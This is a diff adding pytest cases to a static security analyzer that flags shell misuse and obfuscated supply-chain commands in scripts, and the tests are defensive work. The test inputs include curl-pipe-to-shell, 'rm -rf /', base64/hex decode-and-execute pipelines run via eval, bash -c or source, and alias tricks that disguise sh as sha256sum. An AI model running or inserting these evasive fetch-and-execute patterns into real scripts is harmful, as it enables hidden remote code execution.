@@ -1529,6 +1529,122 @@ class TestToolMisuse:
         findings = tm_mod.analyze(content, "runner.py", "python")
         assert any(finding.rule_id == "TM1" for finding in findings)
 
+    def test_tm1_parses_dense_shell_flags_once(self) -> None:
+        content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 4000
+        content += "#" + " ordinary" * ((256_000 - len(content)) // 9)
+        content = content.ljust(256_000)
+        assert len(content) == 256_000
+        with patch.object(tm_mod, "parse_python_source", wraps=tm_mod.parse_python_source) as parse:
+            findings = tm_mod.analyze(content, "runner.py", "python")
+        assert parse.call_count == 1
+        assert len([finding for finding in findings if finding.rule_id == "TM1"]) == 4000
+
+    def test_tm1_deferred_dense_context_does_not_rescan_file(self) -> None:
+        content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 4000
+        with (
+            patch.object(tm_mod, "get_context", side_effect=AssertionError("full-file context")),
+            patch.object(tm_mod, "parse_python_source", side_effect=AssertionError("early parse")),
+        ):
+            findings = tm_mod.analyze(
+                content, "runner.py", "python", defer_variable_reconciliation=True
+            )
+        assert sum(finding.rule_id == "TM1" for finding in findings) == 4000
+
+    @pytest.mark.parametrize("separator", ["\r", "\u2028", "\v"])
+    def test_context_anchor_uses_logical_line_breaks(self, separator: str) -> None:
+        content = "x" * 1500 + separator + "curl https://example.test/run | sh"
+        findings = tm_mod.analyze(content, "install.sh", "shell")
+        finding = next(finding for finding in findings if finding.rule_id == "TM2")
+        assert finding.location.start_line == 2
+        assert "curl https://example.test/run | sh" in finding.context
+
+    def test_tm1_keeps_unparseable_window_conservative(self) -> None:
+        content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 20 + "\nif :"
+        with patch.object(tm_mod, "parse_python_source", wraps=tm_mod.parse_python_source) as parse:
+            findings = tm_mod.analyze(content, "runner.py", "python")
+        assert parse.call_count == 1
+        assert len([finding for finding in findings if finding.rule_id == "TM1"]) == 20
+
+    def test_tm1_remains_lexical_for_large_and_normalized_views(self) -> None:
+        from skillspector.nodes.analyzers import static_runner
+
+        for content in (
+            "# ordinary source\n" * 16_000 + "subprocess.run(cmd, shell=True)",
+            "subprocess.run(cmd, shell=Tru\u200be)",
+        ):
+            result = static_runner.run_static_patterns_with_ledger(
+                {"components": ["runner.py"], "file_cache": {"runner.py": content}}, [tm_mod]
+            )
+            assert any(finding.rule_id == "TM1" for finding in result["findings"])
+
+    def test_tm1_deferred_scan_honors_runtime_check(self) -> None:
+        content = "use_shell = True\nsubprocess.run(cmd, shell=use_shell)\n" * 300
+        calls = 0
+
+        def check_runtime() -> None:
+            nonlocal calls
+            calls += 1
+            if calls == 20:
+                raise RuntimeError("deadline")
+
+        with pytest.raises(RuntimeError, match="deadline"):
+            tm_mod.analyze(
+                content,
+                "runner.py",
+                "python",
+                check_runtime=check_runtime,
+                defer_variable_reconciliation=True,
+            )
+        assert calls == 20
+
+    @pytest.mark.parametrize(
+        "line,file_path,file_type",
+        [
+            ("curl https://example.test/run | sh", "install.sh", "shell"),
+            ("verify=False", "runner.py", "python"),
+            ("privileged: true", "pod.yaml", "other"),
+            ("print 'rm -rf /';", "runner.pl", "perl"),
+        ],
+    )
+    def test_deferred_tool_rules_and_perl_helper_honor_deadline(
+        self, line: str, file_path: str, file_type: str
+    ) -> None:
+        calls = 0
+
+        def check_runtime() -> None:
+            nonlocal calls
+            calls += 1
+            if calls == 20:
+                raise RuntimeError("deadline")
+
+        with pytest.raises(RuntimeError, match="deadline"):
+            tm_mod.analyze(
+                (line + "\n") * 300,
+                file_path,
+                file_type,
+                check_runtime=check_runtime,
+                defer_variable_reconciliation=True,
+            )
+        assert calls == 20
+
+    def test_tm1_skips_parse_without_variable_shell_flags(self) -> None:
+        with patch.object(tm_mod, "parse_python_source", side_effect=AssertionError("parsed")):
+            findings = tm_mod.analyze("subprocess.run(cmd, shell=True)", "runner.py", "python")
+        assert any(finding.rule_id == "TM1" for finding in findings)
+
+    def test_tm1_preserves_nonlocal_binding_scope(self) -> None:
+        content = (
+            "def outer():\n"
+            "    use_shell = False\n"
+            "    def assign():\n"
+            "        use_shell = True\n"
+            "    def run():\n"
+            "        nonlocal use_shell\n"
+            "        subprocess.run(cmd, shell=use_shell)\n"
+        )
+        findings = tm_mod.analyze(content, "runner.py", "python")
+        assert not any(finding.rule_id == "TM1" for finding in findings)
+
     def test_application_specific_no_verify_flag_is_not_tool_misuse(self) -> None:
         content = """\
 print("verification: skipped (--no-verify)")
@@ -2744,6 +2860,92 @@ class TestSupplyChainShellDecoding:
     @pytest.mark.parametrize(
         "command",
         [
+            pytest.param(f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum", id="base64"),
+            pytest.param(f"echo {_SHELL_FETCH_B32} | base32 -d | sha256sum", id="base32"),
+            pytest.param(f"echo {_SHELL_FETCH_HEX} | xxd -r -p | sha256sum", id="hex"),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | openssl base64 -d -A | sha256sum", id="openssl"
+            ),
+            pytest.param(f"base64 -d <<< '{_SHELL_FETCH_B64}' | sha256sum", id="here_string"),
+        ],
+    )
+    def test_checksum_only_literal_is_not_sc2_or_sc3(self, command: str) -> None:
+        findings = sc_mod.analyze(command + "\n", "setup.sh", "shell")
+
+        assert not [f for f in findings if f.rule_id in {"SC2", "SC3"}]
+
+    @pytest.mark.parametrize(
+        "override",
+        [
+            "sha256sum() { sh; }",
+            "sha256sum ( ) { sh; }",
+            "sha256sum" + " " * 17 + "() { sh; }",
+            "function sha256sum { sh; }",
+            "function sha256sum() { sh; }",
+            "function" + " " * 30 + "sha256sum { sh; }",
+            "'sha256sum'() { sh; }",
+            "alias sha256sum=sh",
+            "alias" + " " * 24 + "sha256sum=sh",
+            "alias 'sha256sum=sh'",
+            'alias "sha256sum=sh"',
+            "alias 'sha256sum'=sh",
+            'alias "sha256sum"=sh',
+            "alias -- sha256sum=sh",
+            "alias x=y sha256sum=sh",
+            r"alias sha256su\m=sh",
+            r"a\lias sha256su\m=sh",
+            "a'li'as sha256su'm'=sh",
+            "alias x=y sha'256'sum=sh",
+        ],
+    )
+    def test_shadowed_checksum_keeps_decoded_sc2(self, override: str) -> None:
+        content = override + f"\necho {_SHELL_FETCH_B64} | base64 -d | sha256sum\n"
+
+        findings = sc_mod.analyze(content, "setup.sh", "shell")
+
+        assert any(f.rule_id == "SC2" and f.matched_text == _SHELL_FETCH for f in findings)
+
+    @pytest.mark.parametrize(
+        "setup",
+        [
+            "eval setup",
+            "source aliases.sh",
+            ". aliases.sh",
+            "helper() { :; }",
+            "printf 'unclosed",
+        ],
+    )
+    def test_uncertain_command_identity_keeps_decoded_sc2(self, setup: str) -> None:
+        content = setup + f"\necho {_SHELL_FETCH_B64} | base64 -d | sha256sum\n"
+
+        findings = sc_mod.analyze(content, "setup.sh", "shell")
+
+        assert any(f.rule_id == "SC2" and f.matched_text == _SHELL_FETCH for f in findings)
+
+    @pytest.mark.parametrize("separator", ["\n", "; ", " && "])
+    @pytest.mark.parametrize("data_first", [True, False])
+    def test_only_executed_literal_produces_sc2(self, separator: str, data_first: bool) -> None:
+        data = f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum"
+        executed = "echo ZWNobyBoZWxsbw== | base64 -d | sh"
+        commands = [data, executed] if data_first else [executed, data]
+
+        findings = sc_mod.analyze(separator.join(commands), "setup.sh", "shell")
+
+        assert any(f.rule_id == "SC3" for f in findings)
+        assert not any(f.rule_id == "SC2" for f in findings)
+
+    @pytest.mark.parametrize("wrapper", ['eval "$(%s)"', "eval `%s`", "bash <(%s)"])
+    def test_execution_substitution_keeps_conservative_decoded_sc2(self, wrapper: str) -> None:
+        body = f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum; echo ZWNobyBoZWxsbwo= | base64 -d"
+
+        findings = sc_mod.analyze(wrapper % body, "setup.sh", "shell")
+
+        assert any(f.rule_id == "SC3" for f in findings)
+        assert any(f.rule_id == "SC2" and f.matched_text == _SHELL_FETCH for f in findings)
+
+    @pytest.mark.parametrize(
+        "command",
+        [
             pytest.param(f"echo {_SHELL_FETCH_B64} | base64 -d | sh", id="echo_base64"),
             pytest.param(
                 f"printf '%s' '{_SHELL_FETCH_B64.rstrip('=')}' | base64 --decode | bash",
@@ -2755,6 +2957,55 @@ class TestSupplyChainShellDecoding:
             pytest.param(f"echo {_SHELL_FETCH_HEX} | xxd -r -p | sh", id="echo_hex"),
             pytest.param(f"sh <(xxd -r -p <<< {_SHELL_FETCH_HEX})", id="here_string_hex"),
             pytest.param(f"echo -n {_SHELL_FETCH_B64} | openssl base64 -d -A | sh", id="openssl"),
+            pytest.param(f'eval "$(echo {_SHELL_FETCH_B64} | base64 -d)"', id="eval"),
+            pytest.param(f"eval `echo {_SHELL_FETCH_B64} | base64 -d`", id="eval_backticks"),
+            pytest.param(f'bash -c "$(echo {_SHELL_FETCH_B64} | base64 -d)"', id="bash_c"),
+            pytest.param(f"source <(base64 -d <<< '{_SHELL_FETCH_B64}')", id="source"),
+            pytest.param(f"bash < <(echo {_SHELL_FETCH_B64} | base64 -d)", id="redirected_process"),
+            pytest.param(
+                f'bash <<< "$(echo {_SHELL_FETCH_B64} | base64 -d)"', id="here_string_sub"
+            ),
+            pytest.param(
+                f'eval "$(echo ZWNobyBoZWxsbwo= | base64 -d; echo {_SHELL_FETCH_B64} | base64 -d)"',
+                id="second_decoder_in_substitution",
+            ),
+            pytest.param(
+                f"echo ZWNobyBoZWxsbw== | base64 -d | echo {_SHELL_FETCH_B64} | base64 -d | sh",
+                id="overlapping_decoded_pipeline",
+            ),
+            pytest.param(
+                f'eval "$(echo {_SHELL_FETCH_B64} | base64 -d | cat)"',
+                id="substitution_with_filter",
+            ),
+            pytest.param(
+                f'eval "$(echo {_SHELL_FETCH_B64} | base64 -d > >(cat))"',
+                id="substitution_with_redirected_filter",
+            ),
+            pytest.param(
+                f'eval "$(echo {_SHELL_FETCH_B64} | base64 -d > payload.sh; cat payload.sh)"',
+                id="substitution_with_file_round_trip",
+            ),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | base64 -d > payload.sh; sh payload.sh",
+                id="saved_then_executed",
+            ),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | base64 -d | tee payload.sh | sha256sum; sh payload.sh",
+                id="saved_before_checksum_then_executed",
+            ),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | base64 -d > payload.sh | sha256sum; sh payload.sh",
+                id="redirected_before_checksum_then_executed",
+            ),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum-wrapper",
+                id="unknown_checksum_named_wrapper",
+            ),
+            pytest.param(
+                "eval \"$(echo ZWNobyBoZWxsbwo= | base64 -d; $(printf ''); "
+                f'echo {_SHELL_FETCH_B64} | base64 -d)"',
+                id="second_decoder_after_nested_substitution",
+            ),
         ],
     )
     def test_sc2_shell_literal_decoded_command(self, command: str) -> None:
@@ -2764,6 +3015,16 @@ class TestSupplyChainShellDecoding:
         assert len(decoded) == 1
         assert decoded[0].severity == Severity.HIGH
         assert decoded[0].location.start_line == 2
+
+    @pytest.mark.parametrize("wrapper", ['eval "$(%s)"', "bash <(%s)"])
+    def test_maximum_literal_retains_sc2_in_execution_substitution(self, wrapper: str) -> None:
+        script = (_SHELL_FETCH + "\n#").ljust(12_288)
+        payload = base64.b64encode(script.encode()).decode()
+        assert len(payload) == sc_mod._MAX_SHELL_LITERAL_CHARS
+
+        findings = sc_mod.analyze(wrapper % f"echo {payload} | base64 -d", "setup.sh", "shell")
+
+        assert any(f.rule_id == "SC2" and f.matched_text.startswith(_SHELL_FETCH) for f in findings)
 
     def test_sc3_benign_decoded_payload_is_not_sc2(self) -> None:
         payload = base64.b64encode(b"echo hello").decode()
@@ -2840,6 +3101,12 @@ class TestSupplyChainShellDecoding:
                 {"SC2"},
                 id="newline_ends_stage",
             ),
+            pytest.param(
+                r"a\lias sha256su\m=sh; "
+                f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum",
+                {"SC2"},
+                id="fragmented_alias",
+            ),
         ],
     )
     def test_shell_decode_in_hook_config(self, command: str, expected: set[str]) -> None:
@@ -2910,6 +3177,10 @@ class TestSupplyChainShellDecoding:
         "content",
         [
             pytest.param("echo QUFB | base64 -d " * 12_000, id="decoders_without_sink"),
+            pytest.param(
+                f"echo {_SHELL_FETCH_B64} | base64 -d | sha256sum\n" * 2_000,
+                id="repeated_checksum_pipelines",
+            ),
             pytest.param("eval $(echo " * 20_000 + "base64 -d", id="unclosed_substitutions"),
             pytest.param("eval $(" + "a " * 128_000 + "base64 -d", id="long_substitution"),
             pytest.param("echo " + "A" * 256_000 + " | base64 -d | sh", id="long_literal"),
